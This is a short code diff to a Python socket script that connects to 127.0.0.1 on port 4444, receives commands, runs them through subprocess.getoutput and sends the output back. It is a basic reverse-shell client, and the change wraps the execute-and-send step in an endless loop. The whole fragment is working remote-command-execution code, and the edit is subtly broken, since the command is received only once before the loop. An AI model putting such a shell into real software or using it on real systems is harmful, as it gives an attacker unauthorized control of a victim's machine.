@@ -6,11 +6,13 @@ s.connect(("127.0.0.1", 4444))
 
 command=s.recv(1024).decode()
 
-if command=="exit":
+while True:
+   if command=="exit":
     break
 
-result=subprocess.getoutput(command)
-s.send(result.encode())
+   result=subprocess.getoutput(command)
+   s.send(result.encode())
+
 s.close
 
 
